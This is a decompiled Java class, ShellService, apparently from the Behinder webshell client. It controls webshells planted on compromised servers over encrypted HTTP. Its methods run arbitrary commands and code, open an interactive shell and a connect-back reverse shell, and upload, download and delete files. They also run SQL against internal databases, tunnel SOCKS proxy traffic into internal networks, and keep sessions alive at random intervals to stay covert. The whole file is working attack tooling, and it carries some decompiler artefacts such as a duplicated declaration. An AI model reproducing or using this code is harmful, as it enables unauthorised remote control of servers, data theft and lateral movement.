 package net.rebeyond.behinder.core;
 
 import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 import java.io.FileOutputStream;
 import java.util.Arrays;
 import java.util.HashMap;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Random;
 import net.rebeyond.behinder.utils.Constants;
 import net.rebeyond.behinder.utils.Utils;
 import org.json.JSONObject;
 
 public class ShellService
 {
   public String currentUrl;
   public String currentPassword;
   public String currentKey;
   public String currentType;
   public Map<String, String> currentHeaders;
   public int encryptType = Constants.ENCRYPT_TYPE_AES;
   public int beginIndex = 0; public int endIndex = 0;
   public JSONObject shellEntity;
   public static int BUFFSIZE = 46080;
   
   public ShellService(JSONObject shellEntity, String userAgent) throws Exception {
     this.shellEntity = shellEntity;
     this.currentUrl = shellEntity.getString("url");
     this.currentType = shellEntity.getString("type");
     this.currentPassword = shellEntity.getString("password");
     this.currentHeaders = new HashMap();
     this.currentHeaders.put("User-Agent", userAgent);
     if (this.currentType.equals("php"))
     {
       this.currentHeaders.put("Content-type", "application/x-www-form-urlencoded");
     }
     mergeHeaders(this.currentHeaders, shellEntity.getString("headers"));
     Map<String, String> keyAndCookie = Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders);
     String cookie = (String)keyAndCookie.get("cookie");
     if (((cookie == null) || (cookie.equals(""))) && (!this.currentHeaders.containsKey("cookie")))
     {
       String urlWithSession = (String)keyAndCookie.get("urlWithSession");
       if (urlWithSession != null)
         this.currentUrl = urlWithSession;
       this.currentKey = ((String)Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders).get("key"));
     }
     else
     {
       mergeCookie(this.currentHeaders, cookie);
       this.currentKey = ((String)keyAndCookie.get("key"));
       if ((this.currentType.equals("php")) || (this.currentType.equals("aspx")))
       {
         this.beginIndex = Integer.parseInt((String)keyAndCookie.get("beginIndex"));
         this.endIndex = Integer.parseInt((String)keyAndCookie.get("endIndex"));
       }
     }
   }
   
   private void mergeCookie(Map<String, String> headers, String cookie)
   {
     if (headers.containsKey("Cookie"))
     {
       String userCookie = (String)headers.get("Cookie");
       headers.put("Cookie", userCookie + ";" + cookie);
     }
     else
     {
       headers.put("Cookie", cookie);
     }
   }
   
   private void mergeHeaders(Map<String, String> headers, String headerTxt) {
     String[] arrayOfString;
     int j = (arrayOfString = headerTxt.split("\n")).length; for (int i = 0; i < j; i++) { String line = arrayOfString[i];
       
       int semiIndex = line.indexOf(":");
       if (semiIndex > 0)
       {
         String key = line.substring(0, semiIndex);
         key = formatHeaderName(key);
         String value = line.substring(semiIndex + 1);
         if (!value.equals(""))
         {
           headers.put(key, value); }
       }
     }
   }
   
   private String formatHeaderName(String beforeName) {
     String afterName = "";
     String[] arrayOfString; int j = (arrayOfString = beforeName.split("-")).length; for (int i = 0; i < j; i++) { String element = arrayOfString[i];
       
       element = new StringBuilder(String.valueOf(element.charAt(0))).toString().toUpperCase() + element.substring(1).toLowerCase();
       afterName = afterName + element + "-";
     }
     if ((afterName.length() - beforeName.length() == 1) && (afterName.endsWith("-")))
       afterName = afterName.substring(0, afterName.length() - 1);
     return afterName;
   }
   
   public String eval(String sourceCode) throws Exception { String result = null;
     byte[] payload = null;
     if (this.currentType.equals("jsp")) {
       payload = Utils.getClassFromSourceCode(sourceCode);
     } else {
       payload = sourceCode.getBytes();
     }
     byte[] data = Utils.getEvalData(this.currentKey, this.encryptType, this.currentType, payload);
     
 
     Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     byte[] resData = (byte[])resultObj.get("data");
     result = new String(resData);
     return result;
   }
   
   public JSONObject runCmd(String cmd) throws Exception {
     Map<String, String> params = new LinkedHashMap();
     params.put("cmd", cmd);
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "Cmd", params, this.currentType);
     
 
     Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     byte[] resData = (byte[])resultObj.get("data");
     String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
     resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
     
     JSONObject result = new JSONObject(resultTxt);
     for (String key : result.keySet())
     {
       result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
     }
     return result;
   }
   
   public JSONObject loadJar(String libPath) throws Exception {
     Map<String, String> params = new LinkedHashMap();
     params.put("libPath", libPath);
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "Loader", params, this.currentType);
     
     Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     byte[] resData = (byte[])resultObj.get("data");
     String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
     JSONObject result = new JSONObject(resultTxt);
     for (String key : result.keySet())
     {
       result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
     }
     return result;
   }
   
   public JSONObject createRealCMD(String bashPath) throws Exception {
     Map<String, String> params = new LinkedHashMap();
     params.put("type", "create");
     params.put("bashPath", bashPath);
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
     
 
     Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     byte[] resData = (byte[])resultObj.get("data");
     String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
     JSONObject result;
     JSONObject result;
     if (!this.currentType.equals("php"))
     {
       result = new JSONObject(resultTxt);
     }
     else
     {
       result = new JSONObject();
       result.put("status", Base64.encode("success".getBytes()));
     }
     for (String key : result.keySet())
     {
       result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
     }
     return result;
   }
   
   public JSONObject stopRealCMD() throws Exception {
     Map<String, String> params = new LinkedHashMap();
     params.put("type", "stop");
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
     
     Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     byte[] resData = (byte[])resultObj.get("data");
     String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
     JSONObject result;
     JSONObject result;
     if (!this.currentType.equals("php"))
     {
       result = new JSONObject(resultTxt);
     }
     else
     {
       result = new JSONObject();
       result.put("status", Base64.encode("success".getBytes()));
       result.put("msg", Base64.encode("msg".getBytes()));
     }
     for (String key : result.keySet())
     {
       result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
     }
     return result;
   }
   
   public JSONObject readRealCMD() throws Exception {
     Map<String, String> params = new LinkedHashMap();
     params.put("type", "read");
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
     Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     byte[] resData = (byte[])resultObj.get("data");
     String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
     JSONObject result = new JSONObject(resultTxt);
     for (String key : result.keySet())
     {
       result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
     }
     return result;
   }
   
   public JSONObject writeRealCMD(String cmd) throws Exception {
     Map<String, String> params = new LinkedHashMap();
     params.put("type", "write");
     if (this.currentType.equals("php"))
       params.put("bashPath", "");
     params.put("cmd", Base64.encode(cmd.getBytes()));
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
     
     Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     byte[] resData = (byte[])resultObj.get("data");
     String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
     JSONObject result = new JSONObject(resultTxt);
     for (String key : result.keySet())
     {
       result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
     }
     return result;
   }
   
   public JSONObject listFiles(String path) throws Exception {
     Map<String, String> params = new LinkedHashMap();
     params.put("mode", "list");
     params.put("path", path);
     
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
     
     Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     byte[] resData = (byte[])resultObj.get("data");
     String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
     JSONObject result = new JSONObject(resultTxt);
     for (String key : result.keySet())
     {
       result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
     }
     return result;
   }
   
   public JSONObject deleteFile(String path) throws Exception {
     Map<String, String> params = new LinkedHashMap();
     params.put("mode", "delete");
     params.put("path", path);
     
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
     
     Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     byte[] resData = (byte[])resultObj.get("data");
     String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
     
     JSONObject result = new JSONObject(resultTxt);
     for (String key : result.keySet())
     {
       result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
     }
     return result;
   }
   
   public JSONObject showFile(String path, String charset) throws Exception {
     Map<String, String> params = new LinkedHashMap();
     params.put("mode", "show");
     params.put("path", path);
     if (this.currentType.equals("php"))
     {
       params.put("content", "");
     } else {
       this.currentType.equals("asp");
     }
     
 
     if (charset != null)
       params.put("charset", charset);
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
     
 
     Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     byte[] resData = (byte[])resultObj.get("data");
     String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
     
     JSONObject result = new JSONObject(resultTxt);
     for (String key : result.keySet())
     {
       result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
     }
     return result;
   }
   
   public void downloadFile(String remotePath, String localPath) throws Exception {
     byte[] fileContent = null;
     Map<String, String> params = new LinkedHashMap();
     params.put("mode", "download");
     params.put("path", remotePath);
     
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
     
     fileContent = (byte[])Utils.sendPostRequestBinary(this.currentUrl, this.currentHeaders, data).get("data");
     FileOutputStream fso = new FileOutputStream(localPath);
     fso.write(fileContent);
     fso.flush();
     fso.close();
   }
   
   public JSONObject execSQL(String type, String host, String port, String user, String pass, String database, String sql) throws Exception
   {
     Map<String, String> params = new LinkedHashMap();
     params.put("type", type);
     params.put("host", host);
     params.put("port", port);
     params.put("user", user);
     params.put("pass", pass);
     params.put("database", database);
     params.put("sql", sql);
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "Database", params, this.currentType);
     
     Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     byte[] resData = (byte[])resultObj.get("data");
     String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
     JSONObject result = new JSONObject(resultTxt);
     for (String key : result.keySet())
     {
       result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
     }
     return result;
   }
   
   public JSONObject uploadFile(String remotePath, byte[] fileContent, boolean useBlock) throws Exception
   {
     Map<String, String> params = new LinkedHashMap();
     
     JSONObject result = null;
     if (!useBlock) {
       params.put("mode", "create");
       params.put("path", remotePath);
       params.put("content", Base64.encode(fileContent));
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
       
       Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       byte[] resData = (byte[])resultObj.get("data");
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       result = new JSONObject(resultTxt);
       for (String key : result.keySet())
       {
         result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
       }
     } else {
       List<byte[]> blocks = Utils.splitBytes(fileContent, BUFFSIZE);
       for (int i = 0; i < blocks.size(); i++) {
         if (i == 0) {
           params.put("mode", "create");
         } else
           params.put("mode", "append");
         params.put("path", remotePath);
         params.put("content", Base64.encode((byte[])blocks.get(i)));
         byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
         
         Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
         byte[] resData = (byte[])resultObj.get("data");
         String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
         result = new JSONObject(resultTxt);
         for (String key : result.keySet())
         {
           result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
         }
       }
     }
     return result;
   }
   
   public JSONObject uploadFile(String remotePath, byte[] fileContent) throws Exception
   {
     Map<String, String> params = new LinkedHashMap();
     params.put("mode", "create");
     params.put("path", remotePath);
     params.put("content", Base64.encode(fileContent));
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
     
     Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     byte[] resData = (byte[])resultObj.get("data");
     String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
     
     JSONObject result = new JSONObject(resultTxt);
     for (String key : result.keySet())
     {
       result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
     }
     return result;
   }
   
   public JSONObject appendFile(String remotePath, byte[] fileContent) throws Exception {
     Map<String, String> params = new LinkedHashMap();
     params.put("mode", "append");
     params.put("path", remotePath);
     params.put("content", Base64.encode(fileContent));
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
     
     Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     byte[] resData = (byte[])resultObj.get("data");
     String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
     
     JSONObject result = new JSONObject(resultTxt);
     for (String key : result.keySet())
     {
       result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
     }
     return result;
   }
   
   public byte[] readProxyData() throws Exception {
     byte[] resData = null;
     Map<String, String> params = new LinkedHashMap();
     params.put("cmd", "READ");
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);
     
     Map<String, Object> result = null;
     
     try
     {
       result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     }
     catch (Exception e)
     {
       byte[] exceptionByte = e.getMessage().getBytes();
       if ((exceptionByte[0] == 55) && (exceptionByte[1] == 33) && (exceptionByte[2] == 73) && 
         (exceptionByte[3] == 54))
       {
         return null;
       }
       
 
       throw e;
     }
     
 
     Map<String, String> resHeader = (Map)result.get("header");
     if (((String)resHeader.get("status")).equals("200")) {
       resData = (byte[])result.get("data");
       if ((resData != null) && (resData.length >= 4) && (resData[0] == 55) && (resData[1] == 33) && (resData[2] == 73) && 
         (resData[3] == 54))
       {
 
         resData = null;
       } else {
         if ((resHeader.containsKey("server")) && (((String)resHeader.get("server")).indexOf("Apache-Coyote/1.1") > 0)) {
           resData = Arrays.copyOfRange(resData, 0, resData.length - 1);
         }
         if (resData == null) {
           resData = new byte[0];
         }
       }
     } else {
       resData = null;
     }
     return resData;
   }
   
   public boolean writeProxyData(byte[] proxyData) throws Exception
   {
     Map<String, String> params = new LinkedHashMap();
     params.put("cmd", "FORWARD");
     
 
 
     params.put("targetIP", "");
     params.put("targetPort", "");
     
 
     params.put("extraData", Base64.encode(proxyData));
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);
     
 
     Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     Map<String, String> resHeader = (Map)result.get("header");
     byte[] resData = (byte[])result.get("data");
     if (((String)resHeader.get("status")).equals("200")) {
       if ((resData != null) && (resData.length >= 4) && (resData[0] == 55) && (resData[1] == 33) && (resData[2] == 73) && 
         (resData[3] == 54)) {
         resData = Arrays.copyOfRange(resData, 4, resData.length);
         
         return false;
       }
       return true;
     }
     
     return false;
   }
   
   public boolean closeProxy()
     throws Exception
   {
     Map<String, String> params = new LinkedHashMap();
     params.put("cmd", "DISCONNECT");
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);
     
 
     Map<String, String> resHeader = (Map)Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");
     
     if (((String)resHeader.get("status")).equals("200")) {
       return true;
     }
     return false;
   }
   
   public boolean openProxy(String destHost, String destPort) throws Exception
   {
     Map<String, String> params = new LinkedHashMap();
     params.put("cmd", "CONNECT");
     params.put("targetIP", destHost);
     params.put("targetPort", destPort);
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);
     
 
     Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     Map<String, String> resHeader = (Map)result.get("header");
     byte[] resData = (byte[])result.get("data");
     if (((String)resHeader.get("status")).equals("200")) {
       if ((resData != null) && (resData.length >= 4) && (resData[0] == 55) && (resData[1] == 33) && (resData[2] == 73) && 
         (resData[3] == 54)) {
         resData = Arrays.copyOfRange(resData, 4, resData.length);
         
         return false;
       }
       return true;
     }
     
     return false;
   }
   
   public JSONObject echo(String content) throws Exception
   {
     Map<String, String> params = new LinkedHashMap();
     params.put("content", content);
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "Echo", params, this.currentType);
     
 
 
     Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     byte[] resData = (byte[])resultObj.get("data");
     String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
     resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
     JSONObject result = new JSONObject(resultTxt);
     for (String key : result.keySet())
     {
       result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
     }
     return result;
   }
   
   public String getBasicInfo() throws Exception { String result = "";
     
     Map<String, String> params = new LinkedHashMap();
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "BasicInfo", params, this.currentType);
     
 
 
 
     Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     byte[] resData = (byte[])resultObj.get("data");
     
     try
     {
       result = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
     }
     catch (Exception e)
     {
       e.printStackTrace();
       throw new Exception("请求失败:" + new String(resData, "UTF-8"));
     }
     return result;
   }
   
   public void keepAlive() throws Exception
   {
     try
     {
       for (;;) {
         Thread.sleep((new Random().nextInt(5) + 5) * 60 * 1000);
         getBasicInfo();
       }
     } catch (Exception e) {
       e.printStackTrace();
     }
   }
   
   public JSONObject connectBack(String type, String ip, String port) throws Exception
   {
     Map<String, String> params = new LinkedHashMap();
     params.put("type", type);
     params.put("ip", ip);
     params.put("port", port);
     byte[] data = Utils.getData(this.currentKey, this.encryptType, "ConnectBack", params, this.currentType);
     
     Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
     byte[] resData = (byte[])resultObj.get("data");
     String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
     
     JSONObject result = new JSONObject(resultTxt);
     for (String key : result.keySet())
     {
       result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
     }
     return result;
   }
 }


/* Location:              /Users/0x101/safe/mytools_10012106/afterLoader/Behinder.jar!/net/rebeyond/behinder/core/ShellService.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */